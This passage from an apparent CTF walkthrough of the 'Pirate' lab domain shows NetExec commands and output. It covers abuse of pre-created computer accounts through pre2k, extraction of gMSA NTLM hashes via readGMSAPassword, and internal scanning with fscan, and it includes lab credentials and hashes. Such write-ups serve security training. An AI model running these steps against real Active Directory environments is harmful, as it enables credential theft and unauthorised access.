BloodHound also reveals a potential attack path originating from `a.white`
![](../assets/Pirate/Pasted%20image%2020260309153700.png)

Before this route, we need a path that extends beyond ADCS exploitation to reach the privileged user `a.white`.

## Port 80
Visiting `http://pirate.htb` only returns a default IIS web page. However, on DCs, web servers could be related to:
* AD CS web enrollment
* SharePoint-like services

# User
## Pre2k
As noted earlier, Pre-Windows 2000 Compatible Access (pre2k) is common in legacy environments and retained for compatibility in modern domains. It grants directory read permissions required by older NT systems.

Because this target still allows NTLM authentication (rather than Kerberos-only), its presence is expected.

However, the configuration here is excessively broad:
![](../assets/Pirate/Pasted%20image%2020260309155640.png)
This is a textbook over-permissive Pre-Windows 2000 Compatible Access group: every authenticated principal (Authenticated Users, Domain Users, Domain Computers, and even administrative accounts) inherits these legacy permissions.

As a result, any domain account including low-privileged users like `pentest` gains extensive read access to AD objects (such as computer accounts) and attributes that modern ACLs would normally restrict.

## MS01$ Account
Netexec has a module dedicated for pre2k (`-M pre2k`) for streamlined exploitation:
```bash
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k
```

Using Kerberos, we can also obtain TGTs for affected accounts
```bash 
$ ./ft.sh pirate.htb \ nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -k -M pre2k [*] Querying offset from: pirate.htb [*] faketime -f format: +25144.654913 25144.654913s [*] Running: nxc ldap pirate.htb -u pentest -p p3nt3st2025!& -k -M pre2k LDAP pirate.htb 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) LDAP pirate.htb 389 DC01 [+] pirate.htb\pentest:p3nt3st2025!& PRE2K pirate.htb 389 DC01 Pre-created computer account: MS01$ PRE2K pirate.htb 389 DC01 Pre-created computer account: EXCH01$ PRE2K pirate.htb 389 DC01 [+] Found 2 pre-created computer accounts. Saved to /home/Axura/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt PRE2K pirate.htb 389 DC01 [+] Successfully obtained TGT for ms01@pirate.htb PRE2K pirate.htb 389 DC01 [+] Successfully obtained TGT for exch01@pirate.htb PRE2K pirate.htb 389 DC01 [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/Axura/.nxc/modules/pre2k/ccache $ for f in ~/.nxc/modules/pre2k/ccache/*.ccache; do klist "$f"; done Ticket cache: FILE:/home/Axura/.nxc/modules/pre2k/ccache/exch01.ccache Default principal: exch01@PIRATE.HTB Valid starting Expires Service principal 03/01/2026 02:29:49 03/01/2026 12:29:49 krbtgt/PIRATE.HTB@PIRATE.HTB renew until 03/02/2026 02:29:48 Ticket cache: FILE:/home/Axura/.nxc/modules/pre2k/ccache/ms01.ccache Default principal: ms01@PIRATE.HTB Valid starting Expires Service principal 03/01/2026 02:29:47 03/01/2026 12:29:47 krbtgt/PIRATE.HTB@PIRATE.HTB renew until 03/02/2026 02:29:46 $ cp /home/Axura/.nxc/modules/pre2k/ccache/* .
```
The output 
```bash
Pre-created computer account: MS01$
Pre-created computer account: EXCH01$
```
confirms the classic vulnerability. According to the Netexec [Pre2k Module](https://www.netexec.wiki/ldap-protocol/pre2k):
| Identifies **pre-created computer accounts** in Active Directory and attempts to obtain **Kerberos TGTs** using their default machine password.
It attempts to authenticate using that guessable default password

This effectively gain control of two machine accounts - `MS01$` and `EXCH01` whose passwords match their account names (without the trailing `$`)

## gMSA
Since we have access to two computer accounts, the following path is now clear
![](../assets/Pirate/Pasted%20image%2020260309161344.png)
We can leverage `readGMSAPassword` to compromise `GMSA_ADFS_Prod$` for remote login on the target machine

A gMSA (Group Managed Service Account) is a specialized type of Active Directory account designed specifically to manage services. In the past, administrators often used "Standard" service accounts. Because these accounts were often tied to multiple servers, changing their password meant manually updating it everywhere, which often led to services breaking. To avoid this, admins would set the password to never expire, creating a massive security risk if that password were ever compromised. gMSA solves this by: Automatic Password Management, No Manual Intervention, Service Principal Name (SPN) Management. gMSA rely on the KDS (Key Distribution System) running on Domain Controllers: Creation -> Assignment -> Retrieval -> Security

The `readGMSAPassword` is an access control vulnerability in Active Directory. **The password of a gMSA is stored in the `msDS-ManagedPassword` attribute of the gMSA account object in Active Directory.** The misconfiguration occurs when an administrator--either through human error, overly permissive Group Policy, or legacy "Authenticated Users" permissions-grants Read (or specifically `Control Access` / `Read all properties`) permissions on the gMSA object to a user or group that shouldn't have it
## Get GMSA_ADFS_PROR$
We use Netexec to extract gMSA credentials accounts
```bash
./ft.sh pirate.htb \
nxc ldap pirate.htb -u 'MS01$' -p 'ms01' --gmsa -k
```
The result of the accounts with their NTLM hashes:
```bash
gMSA_ADCS_prod$:304106f739822ea2ad8ebe23f802d078
gMSA_ADFS_prod$:8126756fb2e69697bfcb04816e685839
```

## Coerce Vulnerability
After gaining access, we inspect the internal network
```
ipconfig
 
Windows IP Configuration Ethernet adapter vEthernet (Switch01): Connection-specific DNS Suffix . : Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8 IPv4 Address. . . . . . . . . . . : 192.168.100.1 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : .htb IPv4 Address. . . . . . . . . . . : 10.129.1.12 Subnet Mask . . . . . . . . . . . : 255.255.0.0 Default Gateway . . . . . . . . . : 10.129.0.1 
```

We can use `fscan` tool to scan the intranet `192.168.100.1/24`

```bash
.\fscan.exe -h 192.168.100.1/24 -nobr -nopoc (icmp) Target 192.168.100.1 is alive (icmp) Target 192.168.100.2 is alive [*] Icmp alive hosts len is: 2 192.168.100.1:88 open 192.168.100.2:808 open 192.168.100.2:445 open 192.168.100.1:445 open 192.168.100.2:443 open 192.168.100.2:139 open 192.168.100.1:139 open 192.168.100.2:135 open 192.168.100.2:80 open 192.168.100.1:135 open [*] alive ports len is: 10 start vulscan [*] NetInfo [*]192.168.100.1 [->]DC01 [->]192.168.100.1 [->]10.129.1.12 [*] NetInfo [*]192.168.100.2 [->]WEB01 [->]192.168.100.2 [*] WebTitle http://192.168.100.2 code:200 len:703 title:IIS Windows Server
```
